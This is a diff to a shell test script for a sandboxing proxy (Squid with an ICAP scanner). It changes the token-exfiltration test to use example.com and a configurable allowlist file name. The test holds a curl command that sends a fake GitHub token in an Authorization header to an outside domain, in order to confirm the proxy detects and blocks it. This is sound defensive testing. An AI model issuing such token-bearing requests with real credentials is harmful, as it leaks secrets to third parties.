@@ -478,27 +478,28 @@ echo ""
 
 echo "── 15. Testing token exfiltration header detection..."
 
-EXFIL_TEST_DOMAIN="test-exfil.sandboxed-copilot.invalid"
-# ICAP body scanning requires a domain that resolves (DNS failure aborts the
-# connection before the ICAP adapter runs). Use a real domain that can be
-# temporarily allowlisted; the ICAP scanner blocks before the request reaches
-# the origin, so the origin's response is irrelevant.
+# Both header and body exfil tests require a resolvable domain: ssl_bump must
+# establish an upstream connection before Squid can inspect inner HTTPS headers
+# or call the ICAP adapter. The exfil ACL (header) / ICAP scanner (body) blocks
+# before the origin response matters, so the domain's actual content is irrelevant.
+EXFIL_TEST_DOMAIN="example.com"
 ICAP_TEST_DOMAIN="example.com"
 FAKE_TOKEN="ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 
 # Temporarily allow the test domain so we can prove the exfil ACL overrides it.
-echo "${EXFIL_TEST_DOMAIN}" >> "${PROJECT_DIR}/config/project-allowlist.txt"
+echo "${EXFIL_TEST_DOMAIN}" >> "${PROJECT_DIR}/config/${PROJECT_ALLOWLIST_FILE}"
 sleep 3  # wait for squid to pick up the allowlist change
 
 # Clear any prior exfil.log entries for a clean baseline.
 PROXY_CID=$($COMPOSE ps -q proxy 2>/dev/null | head -1 | tr -d '[:space:]')
 
-# A plain request to the test domain (no token) should time out / fail at DNS
-# (the domain doesn't exist), but the proxy should NOT add it to exfil.log.
-# We only check that the token-bearing request IS in exfil.log.
+# A plain request to the test domain (no token) should succeed but the proxy
+# should NOT add it to exfil.log. We only check that the token-bearing request
+# IS in exfil.log.
 
 # Make the request with a fake token in the Authorization header.
-# curl will fail (domain doesn't resolve or times out) — that's expected.
+# curl may fail or succeed depending on origin response — that's irrelevant;
+# the exfil ACL blocks the request before it reaches the origin.
 run_online "curl -sf --max-time 5 \
     -H 'Authorization: token ${FAKE_TOKEN}' \
     https://${EXFIL_TEST_DOMAIN}/ -o /dev/null 2>/dev/null" || true
@@ -517,8 +518,8 @@ fi
 # Remove the test domain from the project allowlist.
 # Use portable in-place editing (no sed -i on macOS without backup extension).
 ALLOWLIST_TMP=$(mktemp)
-grep -v "^${EXFIL_TEST_DOMAIN}$" "${PROJECT_DIR}/config/project-allowlist.txt" > "$ALLOWLIST_TMP" || true
-mv "$ALLOWLIST_TMP" "${PROJECT_DIR}/config/project-allowlist.txt"
+grep -v "^${EXFIL_TEST_DOMAIN}$" "${PROJECT_DIR}/config/${PROJECT_ALLOWLIST_FILE}" > "$ALLOWLIST_TMP" || true
+mv "$ALLOWLIST_TMP" "${PROJECT_DIR}/config/${PROJECT_ALLOWLIST_FILE}"
 
 echo ""
 
